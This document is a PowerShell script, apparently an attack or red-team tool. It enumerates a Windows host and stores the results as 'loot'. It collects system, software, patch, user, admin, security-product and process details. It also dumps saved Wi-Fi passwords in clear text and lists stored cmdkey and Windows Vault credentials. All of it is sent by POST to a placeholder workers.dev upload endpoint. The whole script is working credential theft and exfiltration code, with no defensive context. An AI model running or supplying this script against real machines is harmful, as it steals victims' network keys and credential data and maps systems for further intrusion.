# Worker URL.
 $workerUrl = "https://WORKER_URL_THING.workers.dev/api/upload"

# In memory array thing...
 $global:loot = [System.Collections.ArrayList]::new()
function Add-Json($T,$D){ [PSCustomObject]@{Category=$T;Timestamp=(Get-Date -Format 'o');Payload=$D} | ConvertTo-Json -Compress | Out-String | ForEach-Object { $null = $global:loot.Add($_) } }

Write-Host "[*] Starting enumeration..." -ForegroundColor Cyan

# Start our enumeration commands...
 $A = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null} | Select-Object -First 1; $S = Get-CimInstance Win32_ComputerSystem; $O = Get-CimInstance Win32_OperatingSystem; $C = Get-CimInstance Win32_Processor;

Add-Json 'CoreInfo' @{Hostname=$S.Name; Internal_IP=$(if($A){($A.IPv4Address.IPAddress)-join','}else{'N/A'}); `
CPU=$C.Name; RAM_GB=[math]::Round(($S.TotalPhysicalMemory/1GB),2); Domain=$S.Domain; OS=$O.Caption; Uptime_Days=[math]::Round((New-TimeSpan -Start $O.LastBootUpTime -End (Get-Date)).TotalDays,0)};

 $RP = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'; `
foreach($r in $RP){ Get-ItemProperty $r | Where-Object {$_.DisplayName} | ForEach-Object { Add-Json 'Software' @{Name=$_.DisplayName; Version=$_.DisplayVersion; Publisher=$_.Publisher} } };

 $bp = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' -ErrorAction SilentlyContinue).ProgId; Add-Json 'DefaultBrowser' @{ProgID=$bp}

Get-SmbMapping -ErrorAction SilentlyContinue | ForEach-Object { Add-Json 'MappedDrives' @{Local=$_.LocalPath; Remote=$_.RemotePath; Status=$_.Status} }

Get-Printer -ErrorAction SilentlyContinue | ForEach-Object { Add-Json 'Printers' @{Name=$_.Name; Driver=$_.DriverName; Shared=$_.Shared} }

 $off = Get-Item "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" -ErrorAction SilentlyContinue; if(-not $off){$off = Get-Item "C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE" -ErrorAction SilentlyContinue}; Add-Json 'OfficeVersion' @{Version=$(if($off){$off.VersionInfo.FileVersion}else{'Not Installed'}); Bitness=$(if($off){if($off.DirectoryName -like "*x86*"){'32-Bit'}else{'64-Bit'}}else{'N/A'})}

 $FY = (Get-Date).AddYears(-5); Get-HotFix | Where-Object {$_.InstalledOn -and $_.InstalledOn -ge $FY} | `
ForEach-Object { Add-Json 'Hotfix' @{ID=$_.HotFixID; Description=$_.Description; InstalledOn=$_.InstalledOn.ToString('yyyy-MM-dd')} };

Get-CimInstance Win32_StartupCommand | Where-Object {$_.Name -or $_.Command} | ForEach-Object { `
 $loc = $_.Location -replace '^HKLM\\','Local Machine\ ' -replace '^HKCU\\','Current User\ ' -replace '^HKU\\','Users\ '; `
Add-Json 'Startup' @{Name=$_.Name; Command=$_.Command; Location=$loc} };

 $pr = netsh wlan show profiles | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}; `
foreach($p in $pr){ $d = netsh wlan show profile name="$p" key=clear | Out-String; $a="None"; $k="None"; `
if($d -match "Authentication\s*:\s*(.+)"){$a=$Matches[1].Trim()}; if($d -match "Key Content\s*:\s*(.+)"){$k=$Matches[1].Trim()}; Add-Json 'WiFi' @{SSID=$p;Auth=$a;Key=$k} }

 $cr = @(); $ob = $null; cmdkey /list | % { if($_ -match "^\s+Target:\s+(.+)"){ if($ob){$cr+=$ob}; $ob = [PSCustomObject]@{Target=$Matches[1].Trim();Type="";User=""} } `
elseif($_ -match "^\s+Type:\s+(.+)"){ $ob.Type = $Matches[1].Trim() } elseif($_ -match "^\s+User:\s+(.+)"){ $ob.User = $Matches[1].Trim() } }; if($ob){$cr+=$ob}; Add-Json 'CmdKey' $cr

Add-Json 'WindowsVault' @(vaultcmd /listcreds:"Windows Credentials" /all);

Add-Json 'BIOS' @(Get-CimInstance Win32_BIOS | Select-Object SerialNumber, SMBIOSBIOSVersion, Manufacturer);

Add-Json 'Disks' @(Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | `
Select-Object DeviceID, @{N='Size_GB';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeSpace_GB';E={[math]::Round($_.FreeSpace/1GB,2)}})

Add-Json 'NetworkAdapters' @(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed); `
Add-Json 'ActiveConnections' @(Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess);

Add-Json 'LocalUsers' @(Get-LocalUser | Select-Object Name, Enabled, `
@{N='LastLogon';E={if($_.LastLogon){$_.LastLogon.ToString('yyyy-MM-dd')}else{'Never'}}}, `
@{N='PasswordExpires';E={$_.PasswordExpires.ToString('yyyy-MM-dd')}})

Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | ForEach-Object { `
 $src = switch($_.PrincipalSource){ 1{'Local'} 2{'ActiveDirectory'} 3{'AzureAD'} 4{'MicrosoftAccount'} default{'Unknown'} }; `
Add-Json 'LocalAdmins' @{Name=$_.Name; Source=$src; Class=$_.ObjectClass} }

 $sc = Get-MpComputerStatus -ErrorAction SilentlyContinue; `
Add-Json 'SecurityCenter' @{Antivirus=$(if($sc.AMServiceEnabled){'Enabled'}else{'Disabled'}); `
Antispyware=$(if($sc.AntispywareEnabled){'Enabled'}else{'Disabled'}); `
RealTimeProtection=$(if($sc.RealTimeProtectionEnabled){'Enabled'}else{'Disabled'})}

Add-Json 'Firewall' @(Get-NetFirewallProfile | Select-Object Name, `
@{N='Status';E={if($_.Enabled){'Enabled'}else{'Disabled'}}})

Get-Process | Where-Object {$_.Path -and $_.Path -notlike "C:\Windows*" -and $_.Path -notlike "C:\Program Files\WindowsApps*"} | ForEach-Object { Add-Json 'UserProcesses' @{Name=$_.Name; Path=$_.Path} }

Get-ScheduledTask | Where-Object {($_.State -eq 'Ready' -or $_.State -eq 'Running') -and $_.TaskPath -notlike "\Microsoft*"} | ForEach-Object { Add-Json 'CustomTasks' @{Name=$_.TaskName; Path=$_.TaskPath} }

Add-Json 'Services' @(Get-CimInstance Win32_Service | Where-Object {$_.State -eq 'Running'} | Select-Object Name, DisplayName, PathName)

Write-Host "[*] Enumeration complete. Collected $($global:loot.Count) lines." -ForegroundColor Cyan
Write-Host "[*] Sending to Worker..." -ForegroundColor Yellow

# Join everything together and send POST request to our worker url.
 $body = $global:loot -join "`r`n"
try {
    $response = Invoke-RestMethod -Method Post -Uri $workerUrl -Body $body -ContentType 'text/plain'
    Write-Host "[+] Success! Worker responded:" -ForegroundColor Green
    Write-Host ($response | ConvertTo-Json)
} catch {
    Write-Host "[-] Failed to send to Worker: $_" -ForegroundColor Red
}
